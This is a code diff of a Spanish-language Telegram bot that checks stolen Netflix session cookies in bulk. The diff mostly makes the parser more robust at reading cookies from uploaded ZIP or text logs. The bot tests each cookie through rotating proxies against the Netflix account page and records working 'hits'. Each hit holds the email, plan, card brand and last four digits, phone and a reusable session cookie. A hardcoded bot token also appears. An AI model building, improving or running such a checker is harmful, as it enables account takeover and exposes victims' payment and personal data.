@@ -19,13 +19,11 @@ import asyncio
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 # --- CONFIGURACIÓN BÁSICA ---
-# Si quieres usar variable de entorno, descomenta la siguiente línea y comenta la de abajo
-# BOT_TOKEN = os.getenv("BOT_TOKEN", "9224399752:AAHWpHvkUUF8KdZe8h30jAkpDuMhZEvG9AQ")
 BOT_TOKEN = os.getenv("BOT_TOKEN", "9224399752:AAHWpHvkUUF8KdZe8h30jAkpDuMhZEvG9AQ")
 DEVELOPER = "AXEL MOLINA"
-VERSION = "3.2.1" # Actualizada a versión corregida
+VERSION = "3.2.1-Robust"
 
-# 🔒 IDs de ADMINS - Puedes añadir más separados por coma en la variable de entorno ADMIN_IDS
+# 🔒 IDs de ADMINS
 ADMIN_IDS_RAW = os.getenv("ADMIN_IDS", "8917082484")
 ADMIN_IDS = [int(x.strip()) for x in ADMIN_IDS_RAW.split(",") if x.strip()]
 
@@ -36,15 +34,13 @@ os.makedirs("hits", exist_ok=True)
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s', handlers=[RotatingFileHandler("logs/bot.log", maxBytes=10*1024*12, backupCount=5, encoding='utf-8'), logging.StreamHandler()])
 logger = logging.getLogger(__name__)
 
-# Logger específico para hits globales
 hit_logger = logging.getLogger('hits')
 hit_handler = RotatingFileHandler("logs/hits.log", maxBytes=10*1024*12, backupCount=5, encoding='utf-8')
 hit_handler.setFormatter(logging.Formatter('%(message)s'))
 hit_logger.addHandler(hit_handler)
 hit_logger.setLevel(logging.INFO)
 
-# 🛡️ Palabras bloqueadas
-SPAM_WORDS = ['luckybear', 'казино', 'casino', 'bond', 'wndpr', 'lucky', 'bear', 'ставки', 'ставка', 'играть', 'выигрыш', 'приз', 'бонус', 't.me/', 'https://t.me/', 'https://wndpr', 'https://bond']
+SPAM_WORDS = ['luckybear', 'казино', 'casino', 'bond', 'wndpr', 'lucky', 'bear', 'ставки', 'ставка', 'играть', 'выигрыш', 'приз', 'бонус', 't.me/', 'https://t.me/', 'https://bond']
 
 UA_WEB = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
 UA_ANDROID = "com.netflix.mediaclient/63884 (Linux; U; Android 13)"
@@ -72,53 +68,113 @@ def _flag(cc):
 def _country(cc):
     return COUNTRY_NAMES.get((cc or "").upper(), cc or "Unknown")
 
-def parse_netscape(text):
-    cookies = {}
-    for line in text.splitlines():
-        line = line.strip()
-        if not line or line.startswith("#"): continue
-        parts = line.split("\t")
-        if len(parts) >= 7: cookies[parts[5]] = parts[6]
-    return cookies
-
-def parse_json_cookies(text):
-    try:
-        data = json.loads(text)
-        if isinstance(data, list): return {c["name"]: c["value"] for c in data if "name" in c and "value" in c}
-        if isinstance(data, dict): return data
-    except: pass
-    return {}
-
-def load_cookies(text):
-    text = text.strip()
-    if text.startswith("[") or text.startswith("{"):
-        c = parse_json_cookies(text)
-        if c: return c
-    c = parse_netscape(text)
-    if c: return c
-    cookies = {}
-    for part in re.split(r"[;\n]", text):
-        part = part.strip()
-        if "=" in part:
-            k, _, v = part.partition("=")
-            k, v = k.strip(), v.strip()
-            if k: cookies[k] = v
-    return cookies
+# --- NUEVA LÓGICA DE LECTURA ROBUSTA ---
 
 def extract_text_from_file(file_bytes, filename):
-    """EXTRAE TEXTO DE ZIP O TXT AUTOMÁTICAMENTE"""
+    """
+    MEJORADA: Busca el bloque de texto más relevante dentro de un ZIP.
+    Ignora archivos pequeños o de configuración y busca el bloque grande de texto.
+    """
+    if not file_bytes: return None
+    
+    # Si es un txt normal, lo decodificamos directo
+    if filename.lower().endswith('.txt') or filename.lower().endswith('.log'):
+        try:
+            return file_bytes.decode('utf-8', errors='ignore')
+        except:
+            return None
+
+    # Si es un ZIP
     if filename.lower().endswith('.zip'):
         try:
             with zipfile.ZipFile(io.BytesIO(file_bytes)) as z:
-                # Busca el primer .txt o .log dentro del zip
-                for name in z.namelist():
-                    if name.endswith(('.txt', '.log')):
-                        return z.read(name).decode('utf-8', errors='ignore')
-                # Si no hay txt, devuelve todo el contenido crudo
-                return z.read(z.namelist()[0]).decode('utf-8', errors='ignore')
-        except Exception:
+                # 1. Intentamos encontrar archivos .txt o .log explícitos
+                candidates = [n for n in z.namelist() if n.endswith(('.txt', '.log'))]
+                
+                if candidates:
+                    # Elegimos el candidato con MÁS líneas (probablemente el de cookies)
+                    best_file = max(candidates, key=lambda f: len(z.read(f).splitlines()))
+                    return z.read(best_file).decode('utf-8', errors='ignore')
+                
+                # 2. Si no hay txt, buscamos cualquier archivo de texto plano
+                text_files = [n for n in z.namelist() if '.' not in n or not any(n.endswith(ext) for ext in ['.jpg','.png','.gif','.exe','.bin','.dat','.pdf','.docx'])]
+                if text_files:
+                     best_file = max(text_files, key=lambda f: len(z.read(f)))
+                     return z.read(best_file).decode('utf-8', errors='ignore')
+
+                # 3. Fallback: devolver el primer archivo crudo
+                if z.namelist():
+                    return z.read(z.namelist()[0]).decode('utf-8', errors='ignore')
+                    
+        except Exception as e:
+            logging.error(f"Error extrayendo ZIP: {e}")
             return None
-    return file_bytes.decode('utf-8', errors='ignore')
+            
+    return None
+
+def load_cookies(text):
+    """
+    MEJORADA: Lector de cookies tolerante a diferentes formatos (Netscape, JSON, Simple).
+    Decodifica caracteres URL-encoded automáticamente.
+    """
+    if not text: return {}
+    
+    text = text.strip()
+    if not text: return {}
+
+    cookies = {}
+
+    # 1. Intento JSON
+    if text.startswith('[') or text.startswith('{'):
+        try:
+            data = json.loads(text)
+            if isinstance(data, list):
+                for c in data:
+                    if 'name' in c and 'value' in c:
+                        cookies[c['name']] = c['value']
+            elif isinstance(data, dict):
+                for k, v in data.items():
+                    cookies[k] = str(v)
+            if cookies: return cookies
+        except: pass
+
+    # 2. Intento Netscape / Texto plano
+    lines = text.splitlines()
+    for line in lines:
+        line = line.strip()
+        if not line or line.startswith('#'): continue
+        
+        # Regex para capturar clave=valor incluso si hay espacios o tabs extraños
+        match = re.match(r'^([^\s\t#]+)\s*[=\t]\s*(.+)$', line)
+        if match:
+            key = match.group(1).strip()
+            val = match.group(2).strip()
+            
+            # Decodificación segura de caracteres especiales (%3D -> =, etc)
+            try:
+                key = urllib.parse.unquote(key)
+                val = urllib.parse.unquote(val)
+            except:
+                pass
+                
+            if key and val:
+                cookies[key] = val
+
+    # 3. Fallback final: Si sigue vacío, intentar dividir por punto y coma o saltos de línea simples
+    if not cookies:
+        parts = re.split(r'[;\n]', text)
+        for part in parts:
+            part = part.strip()
+            if '=' in part:
+                k, _, v = part.partition('=')
+                k, v = k.strip(), v.strip()
+                if k:
+                    try: cookies[urllib.parse.unquote(k)] = urllib.parse.unquote(v)
+                    except: pass
+                    
+    return cookies
+
+# --- RESTO DEL CÓDIGO ORIGINAL (Lógica de Netflix y Telegram) ---
 
 _IOS_API = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
 _IOS_PARAMS = {"appVersion":"15.48.1","config":'{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","billboardEnabled":"true","sharksEnabled":"true","useCDSGalleryEnabled":"true","avifFormatEnabled":"false"}',"device_type":"NFAPPL-02-","esn":"NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200","idiom":"phone","iosVersion":"15.8.5","isTablet":"false","languages":"en-US","locale":"en-US","maxDeviceWidth":"375","model":"saget","modelType":"IPHONE8-1","odpAware":"true","path":'["account","token","default"]',"pathFormat":"graph","pixelDensity":"2.0","progressive":"false","responseFormat":"json"}
@@ -158,23 +214,21 @@ def check_account(cookies: dict, proxy=None, timeout=20):
 
     sess = requests.Session()
     sess.headers.update({"User-Agent":UA_WEB,"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","Accept-Language":"en-US,en;q=0.9","DNT":"1"})
-    
-    # CORRECCIÓN: Decodificar las cookies antes de asignarlas
-    for k, v in cookies.items(): 
-        # urllib.parse.unquote convierte %3D en =, %26 en &, etc.
+
+    # Decodificar las cookies antes de asignarlas
+    for k, v in cookies.items():
         decoded_key = urllib.parse.unquote(k)
         decoded_value = urllib.parse.unquote(v)
         sess.cookies.set(decoded_key, str(decoded_value), domain=".netflix.com", path="/")
-        
+
     if proxy: sess.proxies, sess.verify = {"http":proxy,"https":proxy}, False
 
     try:
         r = sess.get("https://www.netflix.com/account", allow_redirect=True, timeout=timeout)
     except: return None
 
-    # Si nos redirige a login, la cookie era inválida o expirada
     if "login" in r.url.lower() or r.status_code in (401,403): return None
-    
+
     html = r.text
 
     if '"membershipStatus":"CURRENT_MEMBER"' not in html: return None
@@ -234,6 +288,7 @@ def check_account(cookies: dict, proxy=None, timeout=20):
     display_name = name or (profiles_clean[0] if profiles_clean else "N/A")
 
     return {"email":email or "N/A","name":display_name,"country_code":cc,"country":_country(cc),"plan":plan or "N/A","plan_id":plan_id or "N/A","price":price or "N/A","member_since":since or "N/A","next_billing":nextbill or "N/A","free_trial":free_trial,"can_change":can_change,"video_quality":quality,"max_streams":str(streams),"extra_slots":extra_slots,"card_brand":card_brand or "N/A","card_last4":card_last4 or "N/A","payment_method":pay_type or "N/A","phone":phone,"phone_verified":phone_verified,"profiles":profiles_clean,"profile_count":len(profiles_clean),"user_guid":user_guid or "N/A","netflix_id_raw":netflix_id_raw,"login_pc":login_pc,"login_phone":login_phone,"login_tv":login_tv}
+
 class NetflixChecker:
     def __init__(self, threads=5, proxy_list=None, timeout=20):
         self.threads = threads
@@ -268,15 +323,15 @@ class NetflixChecker:
 
     def process_cookie(self, cookie_text):
         cookies = load_cookies(cookie_text)
-        try: 
+        try:
             result = check_account(cookies, proxy=self._next_proxy(), timeout=self.timeout)
         except Exception as e:
             logger.error(f"Error processing cookie: {e}")
-            with self.lock: 
+            with self.lock:
                 self.stats["errors"]+=1
                 self.stats["checked"]+=1
             return None
-        
+
         with self.lock:
             self.stats["checked"]+=1
             if result:
@@ -285,8 +340,8 @@ class NetflixChecker:
                 self.hits.append(result)
                 self._save_hit(result, cookie_text)
                 return result
-            else: 
-                self.stats["bad"]+=1 
+            else:
+                self.stats["bad"]+=1
                 return None
 
     def process_batch(self, cookies_list):
@@ -309,26 +364,17 @@ class NetflixChecker:
         profs = ", ".join(acc["profiles"]) if acc["profiles"] else "N/A"
         nf_id = acc.get("netflix_id_raw","")
         cookie_val = f"NetflixId={nf_id}" if nf_id else acc.get("cookie_raw","")
-        
-        # Escribir en archivo individual
+
         with open(path, "w", encoding="utf-8") as f:
             f.write(f"Email: {acc['email']}\nName: {acc['name']}\nCountry: {acc['country']} ({acc['country_code']})\nPlan: {acc['plan']}\nPrice: {acc['price']}\nMember Since: {acc['member_since']}\nNext Billing: {acc['next_billing']}\nFree Trial: {'Yes' if acc['free_trial'] else 'No'}\nVideo Quality: {acc['video_quality']}\nMax Streams: {acc['max_streams']}\nExtra Slots: {acc['extra_slots']}\nCard: {acc['card_brand']} *{acc['card_last4']}\nPayment Method: {acc['payment_method']}\nPhone: {acc['phone']} | Verified: {acc['phone_verified']}\nProfiles ({acc['profile_count']}): {profs}\n\nLogin PC: {acc['login_pc']}\nLogin Phone: {acc['login_phone']}\nLogin TV: {acc['login_tv']}\n\nCookie: {cookie_val}\n")
-        
-        # Escribir en log global
-        hit_logger.info(f"[{acc['country_code']}] {acc['email']} - {acc['plan']} - {acc['video_quality']}")
 
-    def is_valid_doc(update):
-        doc = update.message.document
-        if not doc: return False
-        ext = doc.file_name.lower().split('.')[-1] if '.' in doc.file_name else ''
-        return ext in ['pdf', 'doc', 'docx', 'txt', 'zip']
+        hit_logger.info(f"[{acc['country_code']}] {acc['email']} - {acc['plan']} - {acc['video_quality']}")
 
 class NetflixCheckerBot:
     def __init__(self, token):
         self.token = token
         self.app = Application.builder().token(token).build()
 
-        # Cargar proxies desde archivo
         proxy_list = []
         if os.path.exists("proxies.txt"):
             with open("proxies.txt", "r", encoding="utf-8") as f:
@@ -344,10 +390,7 @@ class NetflixCheckerBot:
         self.app.add_handler(CommandHandler("done", self.done_command))
         self.app.add_handler(CommandHandler("cancel", self.cancel_command))
 
-        # Manejador de texto normal
         self.app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_message))
-
-        # Manejador de documentos (CORREGIDO)
         self.app.add_handler(MessageHandler(filters.Document.ALL, self.handle_document))
 
     def is_admin(self, user_id):
@@ -370,7 +413,7 @@ class NetflixCheckerBot:
             f"<b>👨‍💻 Desenvolvedor:</b> {DEVELOPER}\n\n"
             f"🔑 Envie su cookie o archivo (.zip/.txt)\n"
             f"📋 /help - Comandos disponibles\n\n"
-            f"🛡️ <b>Antispam ATIVADO!</b>\n"
+            f"🛡️ <b>Antispam ATIVado!</b>\n"
             f"🔒 /stats y /logs - Solo ADM",
             parse_mode="HTML", reply_markup=markup
         )
@@ -460,7 +503,6 @@ class NetflixCheckerBot:
         file_obj = await context.bot.get_file(doc.file_id)
         content = await file_obj.download_as_bytearray()
 
-        # MEJORA: Extraer texto real del archivo (soporta ZIP)
         text_content = extract_text_from_file(content, doc.file_name or "")
 
         if not text_content:
@@ -468,7 +510,6 @@ class NetflixCheckerBot:
              return
 
         await update.message.reply_text("📂 Procesando archivo...")
-        # Dividimos por líneas para procesar cada cookie individualmente
         lines = [line.strip() for line in text_content.split('\n') if line.strip()]
 
         if not lines:
@@ -479,7 +520,6 @@ class NetflixCheckerBot:
         user_id = update.effective_user.id
         if user_id not in self.user_sessions: self.user_sessions[user_id] = []
 
-        # Añadimos cada línea como una cookie independiente
         self.user_sessions[user_id].extend(lines)
 
     async def handle_message(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
